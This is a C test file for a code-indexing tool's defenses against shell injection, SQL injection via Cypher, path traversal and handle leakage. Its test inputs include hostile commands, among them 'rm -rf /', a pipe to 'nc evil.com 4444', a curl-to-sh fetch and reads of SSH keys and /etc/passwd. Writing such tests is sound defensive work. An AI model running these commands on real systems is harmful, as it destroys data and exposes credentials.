/*
 * test_security.c — Tests for security defenses.
 *
 * Verifies that the actual security mechanisms work end-to-end:
 *   - Shell injection prevention (cbm_validate_shell_arg)
 *   - SQLite authorizer (ATTACH/DETACH blocked)
 *   - Path containment (realpath prevents directory traversal)
 */
#include "test_framework.h"
#include "test_helpers.h"
#include <store/store.h>
#include <cypher/cypher.h>
#include "../src/foundation/str_util.h"
#include "../src/foundation/compat_fs.h"
#ifdef _WIN32
#include "../src/foundation/compat_fs_internal.h"
#include "../src/foundation/win_utf8.h"
#include <winsock2.h> /* #798 follow-up: listening-socket isolation guard */
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <wchar.h>
#endif

#include <string.h>
#include <stdio.h>
#include <sys/stat.h>

static char *security_read_file(const char *path) {
    FILE *file = fopen(path, "rb");
    if (!file || fseek(file, 0, SEEK_END) != 0) {
        if (file)
            fclose(file);
        return NULL;
    }
    long size = ftell(file);
    if (size < 0 || fseek(file, 0, SEEK_SET) != 0) {
        fclose(file);
        return NULL;
    }
    char *content = (char *)malloc((size_t)size + 1U);
    if (!content || fread(content, 1U, (size_t)size, file) != (size_t)size) {
        free(content);
        fclose(file);
        return NULL;
    }
    content[size] = '\0';
    fclose(file);
    return content;
}

TEST(vendored_integrity_manifest_is_relocatable_and_fail_closed) {
    FILE *checksums = fopen("scripts/vendored-checksums.txt", "r");
    ASSERT_NOT_NULL(checksums);
    char line[4096];
    size_t entries = 0U;
    while (fgets(line, sizeof(line), checksums)) {
        char hash[65];
        char path[3900];
        if (sscanf(line, "%64s %3899s", hash, path) != 2)
            continue;
        ASSERT_EQ(strlen(hash), 64U);
        ASSERT(strncmp(path, "vendored/", strlen("vendored/")) == 0);
        entries++;
    }
    fclose(checksums);
    ASSERT(entries > 0U);

    char *script = security_read_file("scripts/security-vendored.sh");
    ASSERT_NOT_NULL(script);
    ASSERT_NOT_NULL(strstr(script, "MISSING=$((MISSING + 1))\n        CONTENT_DRIFT=1"));
    ASSERT_NOT_NULL(
        strstr(script,
               "if [[ $CHECKED -eq 0 ]]; then\n    echo \"BLOCKED: checksum manifest verified zero "
               "files\"\n    STRUCTURAL_FAIL=1"));
    free(script);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SHELL INJECTION PREVENTION
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

static const char *security_vendored_fixture_manifest =
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  "
    "vendored/yyjson/safe.c\n";

static int security_make_vendored_fixture(char *root, size_t root_size,
                                          const char *extra_relative_path,
                                          const char *extra_content) {
    if (!root || root_size == 0U || !extra_relative_path || !extra_content)
        return -1;

    int n = snprintf(root, root_size, "%s/cbm_vendored_security_XXXXXX", cbm_tmpdir());
    if (n < 0 || (size_t)n >= root_size || !cbm_mkdtemp(root))
        return -1;

    char *script = security_read_file("scripts/security-vendored.sh");
    if (!script) {
        th_cleanup(root);
        return -1;
    }

    int rc = 0;
    if (th_write_file(TH_PATH(root, "scripts/security-vendored.sh"), script) != 0 ||
        th_write_file(TH_PATH(root, "scripts/vendored-checksums.txt"),
                      security_vendored_fixture_manifest) != 0 ||
        th_write_file(TH_PATH(root, "vendored/yyjson/safe.c"), "") != 0 ||
        th_write_file(TH_PATH(root, extra_relative_path), extra_content) != 0) {
        rc = -1;
    }
    free(script);

    if (rc != 0)
        th_cleanup(root);
    return rc;
}

TEST(vendored_integrity_rejects_unmanifested_source) {
    char root[1024];
    ASSERT_EQ(security_make_vendored_fixture(root, sizeof(root), "vendored/yyjson/unmanifested.h",
                                             "#define CBM_SAFE_EXTRA 1\n"),
              0);

    char script_path[1200];
    snprintf(script_path, sizeof(script_path), "%s/scripts/security-vendored.sh", root);
    const char *argv[] = {"bash", script_path, NULL};
    int rc = cbm_exec_no_shell(argv);
    th_cleanup(root);

    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(vendored_integrity_update_refuses_dangerous_source_without_manifest_mutation) {
    char root[1024];
    ASSERT_EQ(security_make_vendored_fixture(root, sizeof(root), "vendored/yyjson/danger.c",
                                             "int danger(void) { return system(\"true\"); }\n"),
              0);

    char script_path[1200];
    char manifest_path[1200];
    snprintf(script_path, sizeof(script_path), "%s/scripts/security-vendored.sh", root);
    snprintf(manifest_path, sizeof(manifest_path), "%s/scripts/vendored-checksums.txt", root);
    const char *argv[] = {"bash", script_path, "--update", NULL};
    int rc = cbm_exec_no_shell(argv);
    char *manifest_after = security_read_file(manifest_path);
    int manifest_preserved =
        manifest_after && strcmp(manifest_after, security_vendored_fixture_manifest) == 0;
    free(manifest_after);
    th_cleanup(root);

    ASSERT_NEQ(rc, 0);
    ASSERT_TRUE(manifest_preserved);
    PASS();
}

#endif /* !_WIN32 */

TEST(shell_rejects_single_quote) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo'bar"));
    PASS();
}

TEST(shell_rejects_dollar_subst) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(whoami)"));
    PASS();
}

TEST(shell_rejects_backtick) {
    ASSERT_FALSE(cbm_validate_shell_arg("`id`"));
    PASS();
}

TEST(shell_rejects_semicolon) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo;rm -rf /"));
    PASS();
}

TEST(shell_rejects_pipe) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo|nc evil.com 4444"));
    PASS();
}

TEST(shell_rejects_ampersand) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo&background"));
    PASS();
}

TEST(shell_rejects_backslash) {
#ifdef _WIN32
    /* Backslash is allowed on Windows (path separator) */
    ASSERT_TRUE(cbm_validate_shell_arg("foo\\bar"));
#else
    ASSERT_FALSE(cbm_validate_shell_arg("foo\\bar"));
#endif
    PASS();
}

TEST(shell_rejects_newline) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\nbar"));
    PASS();
}

TEST(shell_rejects_carriage_return) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo\rbar"));
    PASS();
}

TEST(shell_rejects_null) {
    ASSERT_FALSE(cbm_validate_shell_arg(NULL));
    PASS();
}

TEST(shell_rejects_double_quote) {
    /* On Windows, the search code path wraps args in cmd.exe-level
     * "powershell -Command \"...'%s'...\"". A " in the input would close
     * the cmd.exe outer quote. Block unconditionally. */
    ASSERT_FALSE(cbm_validate_shell_arg("foo\"bar"));
    PASS();
}

TEST(shell_rejects_redirect_out) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo>out.txt"));
    PASS();
}

TEST(shell_rejects_redirect_in) {
    ASSERT_FALSE(cbm_validate_shell_arg("foo<in.txt"));
    PASS();
}

TEST(shell_accepts_clean_path) {
    ASSERT_TRUE(cbm_validate_shell_arg("/home/user/.local/bin/codebase-memory-mcp"));
    PASS();
}

TEST(shell_accepts_spaces) {
    ASSERT_TRUE(cbm_validate_shell_arg("/Users/John Doe/Documents"));
    PASS();
}

TEST(shell_accepts_dots_dashes) {
    ASSERT_TRUE(cbm_validate_shell_arg("file-name.tar.gz"));
    PASS();
}

TEST(shell_accepts_empty) {
    ASSERT_TRUE(cbm_validate_shell_arg(""));
    PASS();
}

/* Combined attack vectors */
TEST(shell_rejects_quote_escape_attack) {
    /* Attacker tries: ' ; rm -rf / ; echo ' */
    ASSERT_FALSE(cbm_validate_shell_arg("' ; rm -rf / ; echo '"));
    PASS();
}

TEST(shell_rejects_command_substitution) {
    ASSERT_FALSE(cbm_validate_shell_arg("$(curl http://evil.com/shell.sh | sh)"));
    PASS();
}

TEST(shell_rejects_env_var_expansion) {
    ASSERT_FALSE(cbm_validate_shell_arg("${HOME}/.ssh/id_rsa"));
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQLITE AUTHORIZER (ATTACH/DETACH BLOCKED)
 * ══════════════════════════════════════════════════════════════════ */

TEST(sqlite_blocks_attach_via_cypher) {
    /* The Cypher engine translates queries to SQL. Even if someone crafts
     * a Cypher query that somehow produces ATTACH, the SQLite authorizer
     * should deny it. We test by using raw SQL through the store. */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Try ATTACH via Cypher — should fail at parse or authorizer level */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r);
    /* Valid query works */
    ASSERT_EQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_attach_direct) {
    /* Directly test that the store's SQLite authorizer blocks ATTACH.
     * cbm_store_exec_raw() would be ideal but the store is opaque.
     * Instead, try a Cypher query that would generate ATTACH-like SQL.
     * The Cypher parser rejects non-Cypher syntax, so ATTACH never reaches
     * SQLite — this is defense in depth (parser + authorizer). */
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    /* Cypher parser should reject this as invalid syntax */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "ATTACH DATABASE '/tmp/evil.db' AS evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail — either parse error or authorizer deny */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_blocks_detach_direct) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "DETACH DATABASE evil", "test", 0, &r);
    ASSERT_NEQ(rc, 0); /* Must fail */
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

TEST(sqlite_allows_normal_queries) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_node_t n = {.project = "test",
                    .label = "Function",
                    .name = "hello",
                    .qualified_name = "test.hello",
                    .file_path = "main.c",
                    .start_line = 1,
                    .end_line = 5};
    cbm_store_upsert_node(s, &n);

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (f:Function) WHERE f.name = \"hello\" RETURN f", "test",
                                0, &r);
    ASSERT_EQ(rc, 0);
    ASSERT_EQ(r.row_count, 1);

    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  SQL INJECTION VIA CYPHER
 * ══════════════════════════════════════════════════════════════════ */

TEST(cypher_rejects_sql_injection_in_string) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    /* Attempt SQL injection through a WHERE clause string value */
    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(
        s, "MATCH (n) WHERE n.name = \"x\\\"; DROP TABLE nodes; --\" RETURN n", "test", 0, &r);
    /* Must either fail or return 0 rows — must NOT drop the table */
    if (rc == 0) {
        /* Query ran but should find nothing — verify nodes table still exists */
        cbm_cypher_result_free(&r);
        cbm_cypher_result_t r2 = {0};
        int rc2 = cbm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r2);
        ASSERT_EQ(rc2, 0); /* Table must still exist */
        cbm_cypher_result_free(&r2);
    } else {
        cbm_cypher_result_free(&r);
    }

    cbm_store_close(s);
    PASS();
}

TEST(cypher_rejects_union_injection) {
    cbm_store_t *s = cbm_store_open_memory();
    ASSERT_NOT_NULL(s);
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, "MATCH (n) RETURN n UNION SELECT sql FROM sqlite_master", "test",
                                0, &r);
    /* Cypher parser should reject UNION — it's not valid Cypher */
    ASSERT_NEQ(rc, 0);
    cbm_cypher_result_free(&r);

    cbm_store_close(s);
    PASS();
}

/* ══════════════════════════════════════════════════════════════════
 *  PATH CONTAINMENT (POSIX only — realpath() not available on Windows)
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(path_traversal_blocked) {
    /* The get_code_snippet handler uses realpath() to verify that the
     * resolved file path starts with the project root. We test this
     * by calling the MCP handler with a traversal path. Since we can't
     * easily call the MCP handler in a unit test, we verify the
     * containment logic directly. */
    char real_root[4096];
    char real_file[4096];

    /* /tmp is a real directory — create a temporary "project root" */
    const char *root = "/tmp/cbm_security_test_root";
    mkdir(root, 0755);

    if (realpath(root, real_root)) {
        /* Traversal attempt: ../../../etc/passwd relative to root */
        char traversal[512];
        snprintf(traversal, sizeof(traversal), "%s/../../../etc/passwd", root);

        if (realpath(traversal, real_file)) {
            /* Verify the resolved path does NOT start with root */
            size_t root_len = strlen(real_root);
            int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                             (real_file[root_len] == '/' || real_file[root_len] == '\0'));
            ASSERT_FALSE(contained);
        }
        /* If realpath fails, the file doesn't exist — also safe */
    }

    rmdir(root);
    PASS();
}

TEST(path_within_root_allowed) {
    char real_root[4096];
    char real_file[4096];

    const char *root = "/tmp";
    if (realpath(root, real_root) && realpath("/tmp", real_file)) {
        size_t root_len = strlen(real_root);
        int contained = (strncmp(real_file, real_root, root_len) == 0 &&
                         (real_file[root_len] == '/' || real_file[root_len] == '\0'));
        ASSERT_TRUE(contained);
    }
    PASS();
}

#endif /* _WIN32 — path containment */

/* ══════════════════════════════════════════════════════════════════
 *  SHELL-FREE SUBPROCESS EXECUTION (cbm_exec_no_shell)
 *
 *  Replaces system() with fork()+execvp() to eliminate shell
 *  interpretation. Shell metacharacters in arguments are passed
 *  literally, not interpreted.
 * ══════════════════════════════════════════════════════════════════ */

#ifndef _WIN32

TEST(exec_no_shell_true_returns_zero) {
    /* "true" command always exits 0 */
    const char *argv[] = {"true", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_false_returns_nonzero) {
    /* "false" command always exits 1 */
    const char *argv[] = {"false", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_echo_with_metacharacters) {
    /* Shell metacharacters must be passed literally, not interpreted.
     * If shell interpretation occurred, $(whoami) would be expanded. */
    const char *argv[] = {"echo", "$(whoami)", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0); /* echo succeeds — prints literal "$(whoami)" */
    PASS();
}

TEST(exec_no_shell_nonexistent_command) {
    const char *argv[] = {"cbm_nonexistent_binary_12345", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_NEQ(rc, 0); /* must fail — binary doesn't exist */
    PASS();
}

TEST(exec_no_shell_null_argv_returns_error) {
    int rc = cbm_exec_no_shell(NULL);
    ASSERT_NEQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_captures_exit_code) {
    /* sh -c "exit 42" should return 42 */
    const char *argv[] = {"sh", "-c", "exit 42", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 42);
    PASS();
}

#else /* _WIN32 */

/* ──────────────────────────────────────────────────────────────────
 *  WINDOWS COMMAND-LINE QUOTING (cbm_build_cmdline)
 *
 *  Regression guard for #697: cbm_exec_no_shell used _spawnvp, whose
 *  MinGW CRT did not quote arguments containing spaces. The taskkill
 *  filter "IMAGENAME eq codebase-memory-mcp.exe" was passed as three
 *  bare tokens, so taskkill printed
 *      ERROR: Invalid argument/option - 'eq'.
 *  on every install. cbm_build_cmdline now performs MSVC-convention
 *  quoting; these tests pin that behaviour so it cannot silently
 *  regress. The quoting is pure logic, so it runs deterministically in
 *  CI on the windows-latest test job.
 * ────────────────────────────────────────────────────────────────── */

/* Assert that cbm_build_cmdline(argv) produces `expected` (wide). */
#define ASSERT_CMDLINE(argv, expected)                                     \
    do {                                                                   \
        wchar_t *_cl = cbm_build_cmdline(argv);                            \
        ASSERT_NOT_NULL(_cl);                                              \
        if (wcscmp(_cl, (expected)) != 0) {                                \
            free(_cl);                                                     \
            FAIL("cbm_build_cmdline produced an unexpected command line"); \
        }                                                                  \
        free(_cl);                                                         \
    } while (0)

TEST(cmdline_taskkill_filter_is_single_quoted_token) {
    /* The exact #697 regression: the filter value contains spaces and
     * must survive as ONE quoted argument, not three bare words. */
    const char *argv[] = {"taskkill", "/FI", "IMAGENAME eq codebase-memory-mcp.exe", NULL};
    ASSERT_CMDLINE(argv, L"taskkill /FI \"IMAGENAME eq codebase-memory-mcp.exe\"");
    PASS();
}

TEST(cmdline_simple_args_are_not_quoted) {
    /* Arguments with no spaces/tabs/quotes stay bare. */
    const char *argv[] = {"foo", "bar", "baz", NULL};
    ASSERT_CMDLINE(argv, L"foo bar baz");
    PASS();
}

TEST(cmdline_single_arg_no_trailing_space) {
    const char *argv[] = {"codebase-memory-mcp.exe", NULL};
    ASSERT_CMDLINE(argv, L"codebase-memory-mcp.exe");
    PASS();
}

TEST(cmdline_empty_arg_becomes_empty_quotes) {
    /* An empty argument must be preserved as "" so argv positions line up. */
    const char *argv[] = {"cmd", "", "tail", NULL};
    ASSERT_CMDLINE(argv, L"cmd \"\" tail");
    PASS();
}

TEST(cmdline_embedded_quote_is_escaped) {
    /* A literal double-quote is escaped as \" inside the quoted token. */
    const char *argv[] = {"echo", "a\"b", NULL};
    ASSERT_CMDLINE(argv, L"echo \"a\\\"b\"");
    PASS();
}

TEST(cmdline_trailing_backslashes_doubled_before_close_quote) {
    /* Per the MSVC convention, backslashes immediately before the closing
     * quote are doubled so the quote is not accidentally escaped. The arg
     * `C:\dir with space\` becomes "C:\dir with space\\". */
    const char *argv[] = {"type", "C:\\dir with space\\", NULL};
    ASSERT_CMDLINE(argv, L"type \"C:\\dir with space\\\\\"");
    PASS();
}

TEST(cmdline_null_argv_returns_null) {
    /* Defensive: builder over an empty argv still yields a valid (empty)
     * string rather than crashing. */
    const char *argv[] = {NULL};
    wchar_t *cl = cbm_build_cmdline(argv);
    ASSERT_NOT_NULL(cl);
    ASSERT_EQ((int)wcslen(cl), 0);
    free(cl);
    PASS();
}

TEST(cmdline_utf8_arg_is_widened_not_latin1) {
    /* A non-ASCII argument (e.g. a destination under a non-ASCII
     * %USERPROFILE%) must be decoded as UTF-8, not byte-widened as
     * Latin-1. Here "caf\xc3\xa9 dir" is UTF-8 for "café dir": the two
     * bytes C3 A9 must collapse to the single wide code point U+00E9,
     * not survive as U+00C3 U+00A9. The embedded space also forces
     * quoting, so this pins both quoting and correct widening at once. */
    const char *argv[] = {"cd", "caf\xc3\xa9 dir", NULL};
    const wchar_t expected[] = {L'c',   L'd', L' ', L'"', L'c', L'a', L'f',
                                0x00E9, L' ', L'd', L'i', L'r', L'"', L'\0'};
    ASSERT_CMDLINE(argv, expected);
    PASS();
}

TEST(cmdline_utf8_multibyte_roundtrips_via_utf8_to_wide) {
    /* Round-trip guard across wider multibyte shapes: 2-byte umlauts
     * (U+00E4, U+00FC) and 3-byte CJK (U+4E16, U+754C). The argument
     * "t\xc3\xa4st_\xc3\xbcmlaut \xe4\xb8\x96\xe7\x95\x8c" is UTF-8 for
     * "täst_ümlaut 世界"; its space forces quoting. The built command
     * line must equal cbm_utf8_to_wide applied to the same fully-quoted
     * UTF-8 command line — under Latin-1 byte-widening every UTF-8 byte
     * would surface as its own bogus code point and the compare fails. */
    const char *argv[] = {"echo", "t\xc3\xa4st_\xc3\xbcmlaut \xe4\xb8\x96\xe7\x95\x8c", NULL};
    wchar_t *expected =
        cbm_utf8_to_wide("echo \"t\xc3\xa4st_\xc3\xbcmlaut \xe4\xb8\x96\xe7\x95\x8c\"");
    wchar_t *actual = cbm_build_cmdline(argv);
    int ok = (expected != NULL && actual != NULL && wcscmp(actual, expected) == 0);
    free(expected);
    free(actual);
    if (!ok) {
        FAIL("multibyte UTF-8 arg did not round-trip through cbm_build_cmdline");
    }
    PASS();
}

#undef ASSERT_CMDLINE

/* ──────────────────────────────────────────────────────────────────
 *  WINDOWS SHELL-FREE EXECUTION (cbm_exec_no_shell, CreateProcessW path)
 *
 *  Exercises the live CreateProcessW code path end-to-end via cmd.exe so
 *  the Windows spawn path is not left entirely uncovered by CI.
 * ────────────────────────────────────────────────────────────────── */

TEST(exec_no_shell_win_exit_zero) {
    const char *argv[] = {"cmd", "/c", "exit 0", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 0);
    PASS();
}

TEST(exec_no_shell_win_captures_exit_code) {
    const char *argv[] = {"cmd", "/c", "exit 42", NULL};
    int rc = cbm_exec_no_shell(argv);
    ASSERT_EQ(rc, 42);
    PASS();
}

TEST(exec_no_shell_win_null_argv_returns_error) {
    int rc = cbm_exec_no_shell(NULL);
    ASSERT_NEQ(rc, 0);
    PASS();
}

/* ──────────────────────────────────────────────────────────────────
 *  WINDOWS ISOLATED POPEN (handle-inheritance fix for #798)
 *
 *  Regression guard for the UI hang: _popen spawns children with
 *  bInheritHandles=TRUE, leaking every inheritable handle (listening
 *  sockets, Winsock/AFD helpers) into git-for-Windows, whose MSYS2
 *  runtime hangs classifying them via NtQueryObject. cbm_popen must
 *  instead spawn via CreateProcessW + PROC_THREAD_ATTRIBUTE_HANDLE_LIST.
 *
 *  On windows-latest CI (real git-for-Windows) these prove:
 *    - the returned stream came from the isolated spawn, not _popen
 *      (cbm_popen_last_was_isolated test hook) — a revert to raw _popen
 *      turns the hook 0 and fails the guard;
 *    - stdout and the child exit code round-trip through
 *      cbm_popen/cbm_pclose.
 *  NOT proven here: the full UI repro (listening socket + MSYS2 handle
 *  walk under a single-threaded server) — follow-up harness.
 * ────────────────────────────────────────────────────────────────── */

TEST(popen_isolated_git_version_round_trip) {
    FILE *fp = cbm_popen("git --version", "r");
    ASSERT_NOT_NULL(fp);
    ASSERT_EQ(cbm_popen_last_was_isolated(), 1);
    char line[256];
    line[0] = '\0';
    ASSERT_NOT_NULL(fgets(line, sizeof(line), fp));
    ASSERT(strncmp(line, "git version", strlen("git version")) == 0);
    ASSERT_EQ(cbm_pclose(fp), 0);
    PASS();
}

TEST(popen_isolated_propagates_exit_code) {
    /* Runs under `cmd.exe /c`, so a bare `exit 7` is the child exit code;
     * cbm_pclose must surface it via GetExitCodeProcess. */
    FILE *fp = cbm_popen("exit 7", "r");
    ASSERT_NOT_NULL(fp);
    ASSERT_EQ(cbm_popen_last_was_isolated(), 1);
    ASSERT_EQ(cbm_pclose(fp), 7);
    PASS();
}

/* #798 follow-up (the full-repro gap flagged above): prove the EXACT handle class
 * that deadlocked git — an inheritable AFD/listening-socket handle, the kind the
 * UI HTTP server holds — does NOT cross into the cbm_popen child. Unlike the
 * git-version round-trip, this is deterministic on ANY Windows and does not depend
 * on the MSYS2 git build reproducing the NtQueryObject hang.
 *
 * We open a real listening socket, mark it inheritable, then spawn THIS test
 * binary through cbm_popen (a cmd.exe grandchild — exactly git's spawn shape) in
 * `__cbm_sockprobe` mode, passing the socket's numeric handle value. The child
 * reports via exit code whether that handle is a live socket in its address space:
 *   - isolated spawn (the fix): cmd.exe inherits only {pipe, NUL}, the socket is
 *     absent, getsockopt fails  → child exit 0  → GREEN.
 *   - raw _popen (regression): bInheritHandles=TRUE leaks the socket transitively
 *     through cmd.exe into the child, getsockopt succeeds → child exit 42 → RED.
 * Verified RED with a local _popen revert, GREEN with the isolated spawn. */
TEST(popen_isolates_listening_socket) {
    WSADATA wsa;
    ASSERT_EQ(WSAStartup(MAKEWORD(2, 2), &wsa), 0);

    SOCKET ls = socket(AF_INET, SOCK_STREAM, 0);
    ASSERT(ls != INVALID_SOCKET);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7F000001); /* 127.0.0.1 */
    addr.sin_port = 0;                        /* ephemeral */
    ASSERT_EQ(bind(ls, (struct sockaddr *)&addr, sizeof(addr)), 0);
    ASSERT_EQ(listen(ls, 1), 0);
    /* Winsock sockets are inheritable by default; make it explicit so a _popen
     * regression is guaranteed to leak it (and this test to go RED). */
    ASSERT(SetHandleInformation((HANDLE)ls, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT));

    char self[MAX_PATH];
    ASSERT(GetModuleFileNameA(NULL, self, sizeof(self)) > 0);

    char cmd[MAX_PATH + 64];
    snprintf(cmd, sizeof(cmd), "\"%s\" __cbm_sockprobe %llu", self,
             (unsigned long long)(uintptr_t)ls);

    FILE *fp = cbm_popen(cmd, "r");
    ASSERT_NOT_NULL(fp);
    ASSERT_EQ(cbm_popen_last_was_isolated(), 1);
    char drain[128];
    while (fgets(drain, sizeof(drain), fp)) {
        /* the probe writes nothing to stdout, but drain to a clean EOF */
    }
    int rc = cbm_pclose(fp);
    closesocket(ls);
    WSACleanup();

    ASSERT_EQ(rc, 0); /* 0 = socket isolated from child; 42 = leaked (regression) */
    PASS();
}

#endif /* _WIN32 */

/* ══════════════════════════════════════════════════════════════════
 *  SUITE
 * ══════════════════════════════════════════════════════════════════ */

SUITE(security) {
    RUN_TEST(vendored_integrity_manifest_is_relocatable_and_fail_closed);
#ifndef _WIN32
    RUN_TEST(vendored_integrity_rejects_unmanifested_source);
    RUN_TEST(vendored_integrity_update_refuses_dangerous_source_without_manifest_mutation);
#endif
    /* Shell injection prevention */
    RUN_TEST(shell_rejects_single_quote);
    RUN_TEST(shell_rejects_dollar_subst);
    RUN_TEST(shell_rejects_backtick);
    RUN_TEST(shell_rejects_semicolon);
    RUN_TEST(shell_rejects_pipe);
    RUN_TEST(shell_rejects_ampersand);
    RUN_TEST(shell_rejects_backslash);
    RUN_TEST(shell_rejects_newline);
    RUN_TEST(shell_rejects_carriage_return);
    RUN_TEST(shell_rejects_null);
    RUN_TEST(shell_rejects_double_quote);
    RUN_TEST(shell_rejects_redirect_out);
    RUN_TEST(shell_rejects_redirect_in);
    RUN_TEST(shell_accepts_clean_path);
    RUN_TEST(shell_accepts_spaces);
    RUN_TEST(shell_accepts_dots_dashes);
    RUN_TEST(shell_accepts_empty);
    RUN_TEST(shell_rejects_quote_escape_attack);
    RUN_TEST(shell_rejects_command_substitution);
    RUN_TEST(shell_rejects_env_var_expansion);

    /* SQLite authorizer */
    RUN_TEST(sqlite_blocks_attach_via_cypher);
    RUN_TEST(sqlite_blocks_attach_direct);
    RUN_TEST(sqlite_blocks_detach_direct);
    RUN_TEST(sqlite_allows_normal_queries);

    /* SQL injection via Cypher */
    RUN_TEST(cypher_rejects_sql_injection_in_string);
    RUN_TEST(cypher_rejects_union_injection);

    /* Path containment (POSIX only) */
#ifndef _WIN32
    RUN_TEST(path_traversal_blocked);
    RUN_TEST(path_within_root_allowed);
#endif

#ifndef _WIN32
    /* Shell-free subprocess execution */
    RUN_TEST(exec_no_shell_true_returns_zero);
    RUN_TEST(exec_no_shell_false_returns_nonzero);
    RUN_TEST(exec_no_shell_echo_with_metacharacters);
    RUN_TEST(exec_no_shell_nonexistent_command);
    RUN_TEST(exec_no_shell_null_argv_returns_error);
    RUN_TEST(exec_no_shell_captures_exit_code);
#else
    /* Windows command-line quoting (regression guard for #697) */
    RUN_TEST(cmdline_taskkill_filter_is_single_quoted_token);
    RUN_TEST(cmdline_simple_args_are_not_quoted);
    RUN_TEST(cmdline_single_arg_no_trailing_space);
    RUN_TEST(cmdline_empty_arg_becomes_empty_quotes);
    RUN_TEST(cmdline_embedded_quote_is_escaped);
    RUN_TEST(cmdline_trailing_backslashes_doubled_before_close_quote);
    RUN_TEST(cmdline_null_argv_returns_null);
    RUN_TEST(cmdline_utf8_arg_is_widened_not_latin1);
    RUN_TEST(cmdline_utf8_multibyte_roundtrips_via_utf8_to_wide);
    /* Live CreateProcessW spawn path */
    RUN_TEST(exec_no_shell_win_exit_zero);
    RUN_TEST(exec_no_shell_win_captures_exit_code);
    RUN_TEST(exec_no_shell_win_null_argv_returns_error);
    /* Isolated popen — handle-inheritance regression guard for #798 */
    RUN_TEST(popen_isolated_git_version_round_trip);
    RUN_TEST(popen_isolated_propagates_exit_code);
    RUN_TEST(popen_isolates_listening_socket);
#endif
}
